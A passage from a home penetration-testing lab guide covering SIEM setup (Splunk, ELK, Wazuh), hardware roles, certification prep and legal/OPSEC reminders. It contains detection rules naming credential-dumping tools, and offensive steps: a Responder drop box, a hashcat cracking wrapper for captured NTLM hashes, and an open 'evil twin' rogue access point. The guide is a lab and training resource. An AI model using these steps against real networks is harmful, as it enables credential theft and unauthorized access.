sudo /opt/splunk/bin/splunk start --accept-license
sudo /opt/splunk/bin/splunk enable boot-start
```

**Configure Log Forwarding**:

On Windows targets:
```powershell
# Install Splunk Universal Forwarder
# Download and install from Splunk website
# Configure outputs.conf to send to 10.40.40.11:9997

# Forward Windows Event Logs
Add-WindowsFeature -Name RSAT-AD-PowerShell
Install-WindowsFeature -Name Windows-EventCollector

# Configure Windows Event Forwarding to Splunk
```

On Linux targets:
```bash
# Install Splunk forwarder
wget -O splunkforwarder.deb 'https://download.splunk.com/products/universalforwarder/releases/9.1.2/linux/splunkforwarder-9.1.2-b6436b649711-linux-2.6-amd64.deb'
sudo dpkg -i splunkforwarder.deb
sudo /opt/splunkforwarder/bin/splunk start --accept-license
sudo /opt/splunkforwarder/bin/splunk add forward-server 10.40.40.11:9997
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log
```

**Splunk Queries for Pentest Detection**:
```spl
# Failed login attempts
index=windows EventCode=4625 | stats count by src_ip, user

# PowerShell execution
index=windows EventCode=4104 | search ScriptBlockText="*mimikatz*" OR ScriptBlockText="*Invoke-Expression*"

# New process creation (potential malware)
index=windows EventCode=4688 | search NewProcessName="*powershell.exe*" OR NewProcessName="*cmd.exe*"

# Network connections
index=linux sourcetype=syslog "connection" | stats count by src_ip, dest_ip, dest_port

# Nmap scan detection
index=network_traffic | stats dc(dest_port) as port_count by src_ip | where port_count > 100
```

### ELK Stack (Elasticsearch, Logstash, Kibana)

**Docker Compose Deployment**:
```bash
# Install Docker on dedicated VM
qm create 412 --name elk-stack --memory 8192 --cores 2 \
    --net0 virtio,bridge=vmbr1,tag=40 \
    --cdrom local:iso/ubuntu-22.04-server.iso \
    --scsi0 local-lvm:100

# Install Docker and Docker Compose
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo apt install docker-compose

# Create docker-compose.yml
cat <<EOF > docker-compose.yml
version: '3'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - "ES_JAVA_OPTS=-Xms4g -Xmx4g"
    ports:
      - 9200:9200
    volumes:
      - es-data:/usr/share/elasticsearch/data

  logstash:
    image: docker.elastic.co/logstash/logstash:8.11.0
    ports:
      - 5044:5044
      - 514:514/udp
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch

  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    ports:
      - 5601:5601
    depends_on:
      - elasticsearch

volumes:
  es-data:
EOF

# Start ELK
docker-compose up -d
```

**Logstash Configuration** (`logstash.conf`):
```ruby
input {
  # Syslog input
  syslog {
    port => 514
    type => "syslog"
  }
  
  # Beats input (Filebeat, Winlogbeat)
  beats {
    port => 5044
  }
}

filter {
  # Parse Suricata alerts
  if [type] == "suricata" {
    json {
      source => "message"
    }
  }
  
  # Parse Windows Event Logs
  if [type] == "wineventlog" {
    mutate {
      rename => {
        "[event_data][CommandLine]" => "command_line"
        "[event_data][ProcessId]" => "process_id"
      }
    }
  }
}

output {
  elasticsearch {
    hosts => ["elasticsearch:9200"]
    index => "pentest-logs-%{+YYYY.MM.dd}"
  }
  
  stdout {
    codec => rubydebug
  }
}
```

**Kibana Dashboard**: http://10.40.40.12:5601

### Wazuh HIDS/SIEM

**Installation**:
```bash
# Deploy Wazuh manager
qm create 413 --name wazuh --memory 8192 --cores 4 \
    --net0 virtio,bridge=vmbr1,tag=40 \
    --cdrom local:iso/ubuntu-22.04-server.iso \
    --scsi0 local-lvm:100

# Install Wazuh
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash wazuh-install.sh -a
```

**Deploy Agents on Target VMs**:

Linux:
```bash
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
apt-get update
WAZUH_MANAGER="10.40.40.13" apt-get install wazuh-agent
systemctl daemon-reload
systemctl enable wazuh-agent
systemctl start wazuh-agent
```

Windows:
```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi -OutFile wazuh-agent.msi
msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="10.40.40.13"
NET START WazuhSvc
```

**Custom Rules for Pentest Detection**:
```xml
<!-- /var/ossec/etc/rules/local_rules.xml -->
<group name="pentest_detection">
  <!-- Mimikatz detection -->
  <rule id="100001" level="12">
    <if_sid>60000</if_sid>
    <match>mimikatz|sekurlsa|lsadump</match>
    <description>Mimikatz credential dumping detected</description>
    <mitre>
      <id>T1003</id>
    </mitre>
  </rule>
  
  <!-- BloodHound collection -->
  <rule id="100002" level="10">
    <if_sid>60000</if_sid>
    <match>SharpHound|Invoke-BloodHound</match>
    <description>BloodHound AD enumeration detected</description>
    <mitre>
      <id>T1087</id>
    </mitre>
  </rule>
  
  <!-- Responder LLMNR poisoning -->
  <rule id="100003" level="10">
    <if_sid>1002</if_sid>
    <match>Responder</match>
    <description>LLMNR/NBT-NS poisoning tool detected</description>
    <mitre>
      <id>T1557</id>
    </mitre>
  </rule>
</group>
```

### NetAlertX Integration (Raspberry Pi)

**Current Status**: Running on Pi 3b #1

**Purpose**: Network device discovery and monitoring

**Integration with Lab**:
1. Configure NetAlertX to monitor VLAN 20, 30
2. Export alerts to Splunk/Wazuh
3. Use API for automated asset inventory

**API Integration**:
```python
import requests

# NetAlertX API endpoint
api_url = "http://pi-ip:port/api/devices"

# Fetch discovered devices
response = requests.get(api_url)
devices = response.json()

# Alert on new devices in target VLAN
for device in devices:
    if device['ip'].startswith('10.30.30.'):
        if device['is_new']:
            print(f"[ALERT] New device discovered in target VLAN: {device['ip']}")
            # Send alert to Splunk, Wazuh, etc.
```

---

## Hardware Integration Strategies

### ZimaBoard, ZimaBlade, ZimaBoard2 Use Cases

#### ZimaBoard #1 - Network Tap & Packet Capture

**Configuration**:
- **OS**: Ubuntu Server 22.04
- **Network**: Dual NIC in bridge mode
- **Purpose**: Transparent network tap for packet capture

**Setup**:
```bash
# Install on ZimaBoard
sudo apt update && sudo apt install -y tcpdump wireshark tshark

# Configure bridge (inline tap)
sudo apt install bridge-utils
sudo brctl addbr br0
sudo brctl addif br0 eth0
sudo brctl addif br0 eth1
sudo ip link set br0 up

# Capture traffic
sudo tcpdump -i br0 -w /mnt/captures/capture-$(date +%Y%m%d-%H%M%S).pcap

# Or use tshark for specific filters
sudo tshark -i br0 -f "tcp port 445 or tcp port 139" -w smb-traffic.pcap
```

**Automated Packet Rotation**:
```bash
# Cron job for daily PCAP rotation
0 0 * * * tcpdump -i br0 -G 86400 -w /mnt/captures/capture-%Y%m%d-%H%M%S.pcap -Z root
```

#### ZimaBlade - Covert Implant Simulation

**Configuration**:
- **OS**: Kali Linux ARM or Debian
- **Purpose**: Physical red team drop box simulation

**Use Cases**:
1. Simulate attacker gaining physical access
2. Test internal network defenses
3. Practice detection of rogue devices

**Setup**:
```bash
# Install pentesting tools
sudo apt install -y nmap crackmapexec evil-winrm responder

# Auto-start Responder on boot
sudo systemctl enable responder

# Cron job for automated scans
0 */4 * * * nmap -sn 10.30.30.0/24 >> /var/log/scans.log
```

**Detection Challenge**: Can blue team identify the ZimaBlade on the network?

#### ZimaBoard2 + RTX 3050 - Dedicated Password Cracking Station

**Configuration**:
- **OS**: Ubuntu Server 22.04 with NVIDIA drivers
- **GPU**: RTX 3050 with CUDA 12.x
- **Network**: Attack VLAN (10.20.20.50)

**Optimized Setup**:
```bash
# Install CUDA and hashcat (as shown earlier)

# Benchmark GPU
hashcat -b

# Create hashcat wrapper script
cat <<'EOF' > /usr/local/bin/crack-hash
#!/bin/bash
# GPU-accelerated hash cracking wrapper

HASH_FILE=$1
WORDLIST=${2:-/mnt/pentest-data/wordlists/rockyou.txt}
HASH_TYPE=${3:-1000}  # Default: NTLM

hashcat -m $HASH_TYPE -a 0 -w 4 --session crack-session $HASH_FILE $WORDLIST

# If not cracked, try rules
if [ $? -ne 0 ]; then
    hashcat -m $HASH_TYPE -a 0 -w 4 --session crack-session $HASH_FILE $WORDLIST -r /usr/share/hashcat/rules/best64.rule
fi
EOF

chmod +x /usr/local/bin/crack-hash
```

**Remote Job Submission**:
```bash
# From Kali attacker VM
scp captured-hashes.txt user@10.20.20.50:~/jobs/
ssh user@10.20.20.50 "crack-hash ~/jobs/captured-hashes.txt"
```

**Performance Monitoring**:
```bash
# Monitor GPU utilization
watch -n 1 nvidia-smi

# Monitor hashcat progress
hashcat --session crack-session --status
```

### Raspberry Pi Integration

#### Pi #1 - NetAlertX (Already Configured)

**Enhancements**:
- Forward alerts to Splunk
- API integration for asset management
- Configure for VLAN monitoring

#### Pi #2 - OpenWRT Reconfiguration Options

**Option 1: Wireless Pentesting AP**
- Configure as rogue AP for evil twin attacks
- Use with WiFi Pineapple techniques
- Test wireless IDS detection

**Option 2: Honeypot Device**
- Deploy Cowrie (SSH honeypot)
- Monitor attacks against fake service
- Integrate logs with blue team SIEM

**Option 3: Secondary Firewall/Router**
- OpenWRT for additional network segmentation
- VPN gateway for remote lab access
- Traffic shaping for realistic WAN simulation

**Recommendation**: Configure as **Wireless Pentesting AP** for most value

**Setup**:
```bash
# Flash OpenWRT (if not already)
# Configure as AP on VLAN 30 (Target network)

# Install pentesting packages
opkg update
opkg install tcpdump hostapd-utils

# Configure evil twin AP
uci set wireless.@wifi-iface[0].ssid='CorporateWiFi'
uci set wireless.@wifi-iface[0].encryption='none'
uci commit wireless
wifi reload

# Forward to OPNsense for monitoring
```

---

## Practice Scenarios & Certifications

### OSCP Preparation

**Your Lab Matches OSCP Requirements**:
- ✅ Active Directory environment
- ✅ Linux privilege escalation targets
- ✅ Web application exploitation
- ✅ Buffer overflow practice (add Windows XP VM)
- ✅ Pivoting and port forwarding

**Additional Setup for OSCP**:

**Buffer Overflow Practice**:
```bash
# Deploy Windows 7 or Windows XP VM
qm create 340 --name bof-practice --memory 2048 --cores 1 \
    --net0 virtio,bridge=vmbr1,tag=30 \
    --cdrom local:iso/Win7_x86.iso \
    --scsi0 local-lvm:40

# Install vulnerable software:
# - Vulnserver
# - SLMail
# - Minishare
```

**Pivoting Practice**:
```bash
# Deploy dual-homed target (connected to hidden network)
qm create 341 --name pivot-target --memory 2048 --cores 1 \
    --net0 virtio,bridge=vmbr1,tag=30 \
    --net1 virtio,bridge=vmbr1,tag=50  # Hidden network
    --cdrom local:iso/ubuntu-22.04-server.iso \
    --scsi0 local-lvm:40

# Practice techniques:
# - SSH tunneling
# - Chisel
# - Ligolo-ng
# - Metasploit autoroute
```

**OSCP-Style Practice Boxes**:
- Use VulnHub OSCP-like VMs
- TryHackMe OSCP Prep path
- Proving Grounds Practice (Offensive Security)

**Recommended Practice Schedule**:
1. Week 1-2: Enumeration & Reconnaissance
2. Week 3-4: Web App Exploitation (DVWA, OWASP BWA)
3. Week 5-6: Linux Privilege Escalation (custom scenarios)
4. Week 7-8: Windows Privilege Escalation (AD focus)
5. Week 9-10: Buffer Overflows (BOF practice VMs)
6. Week 11-12: Pivoting & Exam Simulation

### GPEN Preparation

**SANS GPEN Topics Covered**:
- ✅ Network reconnaissance
- ✅ Linux and Windows exploitation
- ✅ Password attacks
- ✅ Web application security
- ✅ Wireless attacks (if WiFi adapter available)

**Additional Setup**:
- Deploy additional Windows targets with different configurations
- Practice with specific tools: Metasploit, Nmap, Burp, Nessus
- Simulate external pentests (restricted network access)

### PNPT Preparation (TCM Security)

**PNPT Requirements**:
- ✅ Active Directory exploitation
- ✅ External and internal network pentesting
- ✅ Reporting (practice writing reports)

**AD Attack Path Practice**:
1. External reconnaissance → Internal access
2. User compromise → Privilege escalation
3. Lateral movement → Domain admin
4. Persistence and cleanup

### CRTP Preparation (Certified Red Team Professional)

**Focus**: Advanced Active Directory attacks

**Setup Requirements**:
```bash
# Create multi-domain forest
# DC01 (root domain): pnwlab.local
# DC02 (child domain): child.pnwlab.local
# Trust relationships configured

# Deploy:
qm clone 300 302 --name dc02-child
# Configure child domain controller

# Practice topics:
# - Kerberoasting
# - AS-REP roasting
# - Unconstrained delegation
# - Constrained delegation
# - Golden/Silver tickets
# - Trust exploitation
```

---

## OPSEC & Safety Protocols

### Critical Safety Rules

**NEVER VIOLATE THESE**:

1. **Never connect Target VLAN directly to internet**
   - All vulnerable VMs must be isolated
   - No direct routing to WAN
   - Exception: Windows updates through controlled firewall rules

2. **Never test on production networks**
   - Lab is isolated for a reason
   - Penetration testing without authorization is illegal

3. **Always verify network segmentation**
   ```bash
   # Test from Attack VLAN
   ping 10.10.10.5  # Should FAIL (Management VLAN)
   ping 10.30.30.10 # Should SUCCEED (Target VLAN)
   ping 8.8.8.8     # Should SUCCEED (Internet)
   
   # Test from Target VLAN
   ping 10.10.10.5  # Should FAIL
   ping 10.20.20.10 # Should FAIL (Attack initiates, not target)
   ping 8.8.8.8     # Should FAIL (unless allowed for updates)
   ```

4. **Snapshot before destructive testing**
   - Always create snapshot before:
     - Malware execution
     - Exploit testing
     - Privilege escalation
     - Lateral movement
   
   ```bash
   # Create snapshot
   qm snapshot <vmid> pre-exploit --description "Before testing CVE-2024-XXXX"
   
   # Rollback if needed
   qm rollback <vmid> pre-exploit
   ```

5. **Use VLAN 99 for dangerous activities**
   - Malware analysis
   - Ransomware simulation
   - Destructive exploits
   - NEVER connect to other VLANs

### Personal OPSEC Rules (From Your Guide)

**From ULTIMATE-CYBERSECURITY-MASTER-GUIDE**:

1. **ALWAYS use 3rd party network for real engagements**
   - Lab is for practice only
   - Use VPN, coffee shop, or other network for actual pentests
   - Never use home IP for client work

2. **VM isolation for sensitive work**
   - Dedicated attacker VM per client/engagement
   - Separate OSINT VM (no pentesting tools)
   - Never mix personal and work VMs

3. **Tool sandboxing**
   - Test new tools in isolated VMs first
   - Verify tools are not backdoored
   - Check GitHub repos for malicious code

4. **Data sanitization**
   - Clear browser history, cookies after OSINT
   - Wipe VM after sensitive engagements
   - Securely delete captured data when no longer needed

5. **Physical security**
   - Encrypt all drives (TrueNAS, Proxmox, VMs)
   - Lock rack when not in use
   - Use strong passwords everywhere
   - Consider IDRAC/IPMI access controls

### Lab Maintenance & Hygiene

**Daily**:
- Check OPNsense logs for unexpected traffic
- Review Security Onion alerts
- Verify all VMs are in correct VLANs

**Weekly**:
- Update attacker VMs (Kali, Parrot)
- Review blue team detection capabilities
- Test backup/restore procedures
- Rotate logs to prevent disk fill

**Monthly**:
- Update target VMs (security patches on non-vulnerable systems)
- Review firewall rules
- Update toolsets and wordlists
- Practice full lab rebuild from IaC

**Quarterly**:
- Test disaster recovery procedures
- Update documentation
- Review and improve detection rules
- Conduct full security audit of lab infrastructure

### Legal Reminders

**This lab is for:**
- ✅ Learning cybersecurity skills
- ✅ Preparing for certifications
- ✅ Testing your own systems
- ✅ Authorized penetration testing (with written permission)

**This lab is NOT for:**
- ❌ Unauthorized access to any system
- ❌ Attacking systems outside your lab
- ❌ Illegal activities of any kind
- ❌ Sharing exploits publicly without disclosure process

**Authorization Template** (for legal pentests):
```
Penetration Testing Authorization

I, [Client Name], authorize [Your Name/Company] to perform penetration 
testing on the following systems:

Scope:
- IP Ranges: [list]
- Domains: [list]
- Systems: [list]

Out of Scope:
- [list]

Testing Period: [start date] to [end date]

Authorized Techniques:
- [list: e.g., port scanning, vulnerability scanning, exploitation, etc.]

Rules of Engagement:
- Testing hours: [e.g., business hours only, 24/7]
- DoS testing: [allowed/not allowed]
- Social engineering: [allowed/not allowed]
- Physical security testing: [allowed/not allowed]

Emergency Contact: [phone], [email]

Signature: _____________________ Date: _________
```

---

## Continuous Learning Path

### Recommended Progression

**Phase 1: Foundations (Months 1-3)**
- ✅ Build and configure lab (complete)
- ✅ Learn basic Linux and Windows administration
- ✅ Master Nmap, Metasploit, Burp Suite basics
- ✅ Complete DVWA, Metasploitable 2
- 📚 Read: "The Basics of Hacking and Penetration Testing"

**Phase 2: Intermediate Skills (Months 4-6)**
- ✅ Active Directory exploitation
- ✅ Web application pentesting (OWASP BWA)
- ✅ Password cracking with GPU
- ✅ Network pivoting and tunneling
- 📚 Read: "Penetration Testing" by Georgia Weidman
- 🎓 Course: TryHackMe Offensive Security path

**Phase 3: Advanced Techniques (Months 7-9)**
- ✅ Custom exploit development
- ✅ Advanced AD attacks (Kerberoasting, DCSync)
- ✅ C2 frameworks (Sliver, Cobalt Strike)
- ✅ OSINT investigations (400+ tools from your guide)
- 📚 Read: "The Hacker Playbook 3"
- 🎓 Course: HackTheBox Pro Labs

**Phase 4: Specialization (Months 10-12)**
- Choose focus area:
  - **Red Team**: Advanced persistence, evasion
  - **Blue Team**: Detection engineering, SIEM tuning
  - **Web AppSec**: Advanced SQLi, XXE, SSRF
  - **Hardware**: IoT, embedded systems, UART hacking
  - **OSINT**: Advanced techniques, threat intelligence
- 🎓 Certification: OSCP, PNPT, or GPEN

**Phase 5: Professional Development (Ongoing)**
- Bug bounty programs (HackerOne, Bugcrowd)
- Contribute to security community
- Develop custom tools and exploits
- Publish research and findings
- Attend conferences (DEF CON, Black Hat, BSides)

### Training Platforms Integration

**TryHackMe**:
- Recommended paths: Pre Security → Offensive Pentesting → Red Team
- VPN access from Attack VLAN (secure your lab)
- Integrate learnings into custom scenarios

**HackTheBox**:
- Active and retired machines for practice
- Pro Labs for enterprise network simulation
- Consider HTB Academy for structured learning

**PortSwigger Web Security Academy**:
- Free web application security training
- Practice in your DVWA/OWASP BWA lab
- Hands-on labs with guided solutions

**VulnHub**:
- Download VMs and import to Proxmox
- Wide variety of difficulty levels
- Community-driven CTF challenges

### Books from Your ULTIMATE-CYBERSECURITY-MASTER-GUIDE

**Must-Read (Available in Your Guide)**:
1. ✅ Metasploit: The Penetration Tester's Guide (2nd Edition)
2. ✅ Penetration Testing: A Hands-On Introduction to Hacking
3. ✅ The Hacker Playbook 3
4. ✅ RTFM: Red Team Field Manual
5. ✅ Blue Team Field Manual (BTFM)
6. ✅ Linux Basics for Hackers
7. ✅ The Web Application Hacker's Handbook

**Advanced Reading**:
8. ✅ Advanced Penetration Testing: Hacking the World's Most Secure Networks
9. ✅ Practical Reverse Engineering
10. ✅ Black Hat Python

### Community & Resources

**Online Communities**:
- Reddit: r/netsec, r/AskNetsec, r/OSCP
- Discord: TryHackMe, HackTheBox, NetSec Focus
- Twitter/X: #infosec, #redteam, #blueteam

**Blogs & News**:
- Krebs on Security
- Schneier on Security
- Dark Reading
- The Hacker News

**YouTube Channels**:
- IppSec (HackTheBox walkthroughs)
- John Hammond
- NetworkChuck
- STÖK (bug bounty)
- LiveOverflow (technical deep dives)

**Conferences** (Virtual & In-Person):
- DEF CON (Las Vegas, August)
- Black Hat USA (Las Vegas, July/August)
- BSides (local chapters worldwide)
- ShmooCon (Washington DC)

---

## Conclusion

### What You've Built

You now have a **professional-grade penetration testing laboratory** that leverages:

✅ **Enterprise hardware**: Dell R630 servers with substantial compute power  
✅ **Professional virtualization**: Proxmox with clustering capability  
✅ **Centralized storage**: TrueNAS for templates and data management  
✅ **Network segmentation**: OPNsense with VLANs for realistic scenarios  
✅ **GPU acceleration**: RTX 3050 for password cracking  
✅ **Edge computing**: Zima devices for IoT/embedded testing  
✅ **Blue team integration**: Security Onion, Splunk, ELK for detection  
✅ **Multi-architecture**: x86-64 + ARM for diverse testing  

This setup **exceeds most home labs** and rivals small corporate penetration testing environments.

### Next Steps

1. **Complete initial setup**:
   - Deploy core VMs (Kali, targets, blue team)
   - Configure VLANs and firewall rules
   - Test network segmentation

2. **Run first scenario**:
   - Start with Scenario 1: Active Directory Pentesting
   - Document your attack chain
   - Review blue team detections

3. **Iterate and improve**:
   - Add more targets as you learn
   - Refine detection rules
   - Automate repetitive tasks

4. **Practice regularly**:
   - Set aside dedicated lab time weekly
   - Follow your learning path
   - Track progress and skills gained

5. **Share knowledge**:
   - Document your labs and share on GitHub
   - Write blog posts about your learnings
   - Contribute back to the community

### Resources & Support

**Your Existing Resources**:
- ✅ ULTIMATE-CYBERSECURITY-MASTER-GUIDE (70+ books compiled)
- ✅ 400+ OSINT tools organized
- ✅ 90+ internal documents and procedures
- ✅ Custom scripts and automation
- ✅ Hardware arsenal documented

**Need Help?**
- Review your cybersecurity guides first
- Search specific errors online
- Ask in security communities (with sanitized info)
- Never share details about client work

---

## Appendix: Quick Reference

### VM Quick Reference

| VM Name | VMID | VLAN | IP | Cores | RAM | Purpose |
|---------|------|------|-----|-------|-----|---------|
| kali-primary | 200 | 20 | 10.20.20.10 | 6 | 16GB | Primary attacker |
| parrot-sec | 201 | 20 | 10.20.20.11 | 4 | 8GB | Alternative attacker |
| win11-attacker | 202 | 20 | 10.20.20.12 | 4 | 8GB | Windows attacks |
| dc01-target | 300 | 30 | 10.30.30.10 | 4 | 16GB | Domain controller |
| sql01-target | 301 | 30 | 10.30.30.11 | 4 | 16GB | SQL Server |
| wks01-05 | 310-314 | 30 | 10.30.30.20-24 | 2 | 4GB | Workstations |
| metasploitable2 | 320 | 30 | 10.30.30.70 | 1 | 2GB | Vulnerable Linux |
| dvwa-ubuntu | 322 | 30 | 10.30.30.72 | 2 | 4GB | Web app testing |
| owasp-bwa | 323 | 30 | 10.30.30.73 | 2 | 4GB | Web vulnerabilities |
| security-onion | 410 | 40 | 10.40.40.10 | 4 | 16GB | IDS/SIEM |
| splunk | 411 | 40 | 10.40.40.11 | 2 | 8GB | Log aggregation |
| elk-stack | 412 | 40 | 10.40.40.12 | 2 | 8GB | Elasticsearch/Kibana |
| wazuh | 413 | 40 | 10.40.40.13 | 4 | 8GB | HIDS/SIEM |

### Command Quick Reference

**Proxmox Management**:
```bash
# List all VMs
qm list

# Start VM
qm start <vmid>

# Stop VM
qm stop <vmid>

# Snapshot
qm snapshot <vmid> <snapshot-name>

# Rollback
qm rollback <vmid> <snapshot-name>

# Clone VM
qm clone <vmid> <new-vmid> --name <new-name>
```

**Network Testing**:
```bash
# Test segmentation from Attack VLAN
ping 10.30.30.10  # Target (should work)
ping 10.10.10.5   # Management (should fail)

# Port scan
nmap -sV -p- 10.30.30.10

# Quick network sweep
nmap -sn 10.30.30.0/24
```

**Snapshot Management**:
```bash
# List snapshots
qm listsnapshot <vmid>

# Delete snapshot
qm delsnapshot <vmid> <snapshot-name>
```

### Firewall Quick Reference

**OPNsense Important Rules**:
- VLAN 20 → VLAN 30: Allow (red team attacks)
- VLAN 30 → VLAN 20: Deny (targets can't reverse connect)
- VLAN 10 → All: Deny (management isolation)
- VLAN 99 → All: Deny (full isolation)

**IDS Alerts Location**:
- OPNsense: /var/log/suricata/eve.json
- Security Onion: Kibana dashboard
- Splunk: Search interface
- Wazuh: Web UI alerts

### Tool Locations

**NFS Shares**:
- Pentest data: `/mnt/pentest-data`
- Wordlists: `/mnt/pentest-data/wordlists`
- Custom tools: `/mnt/pentest-data/tools`
- Exploits: `/mnt/pentest-data/exploits`

**Key Wordlists**:
- rockyou.txt: `/mnt/pentest-data/wordlists/rockyou.txt`
- SecLists: `/mnt/pentest-data/wordlists/SecLists/`

---

## Final Thoughts

You've been given a comprehensive roadmap to transform your existing enterprise hardware into a world-class penetration testing laboratory. This setup, combined with your **ULTIMATE-CYBERSECURITY-MASTER-GUIDE** containing knowledge from 70+ professional books and 90+ internal documents, gives you:

1. **Professional infrastructure** that mirrors real-world corporate networks
2. **Practical hands-on experience** with industry-standard tools
3. **Certification preparation** for OSCP, PNPT, GPEN, CRTP
4. **Career advancement** capabilities in offensive or defensive security
5. **Community contribution** potential through shared research

Remember:
- **Start simple**, then add complexity
- **Document everything** you do
- **Practice regularly** to build muscle memory
- **Stay ethical** and always get authorization
- **Never stop learning** - security is constantly evolving

Your lab is now ready. **Time to hack responsibly!**

---

**Lab Established**: November 2025  
**Guide Version**: 1.0  
**Author**: Pacific NorthWest Computers  

**Questions? Improvements? Contributions?**  
- Update your GitHub repository
- Share your lab configurations
- Document your unique scenarios
- Help others build their labs

**Happy Responsible PenTesting! 🚀🔐**

*****

## Security and Ethical Considerations ⚠️

**IMPORTANT**: These instructions and guides are for **authorized security testing only**. Unauthorized access to networks is illegal. Always:
- Get written permission before testing devices or networks other than your own
- Only test networks you own or have explicit authorization to test
- Follow responsible disclosure practices
- Comply with local laws and regulations
- Use for educational purposes in controlled environments

**Legal Use Cases:**
- Penetration testing with client authorization
- Security research in isolated lab environments
- Testing your own network security
- Educational purposes with proper supervision
- CTF (Capture The Flag) competitions

---
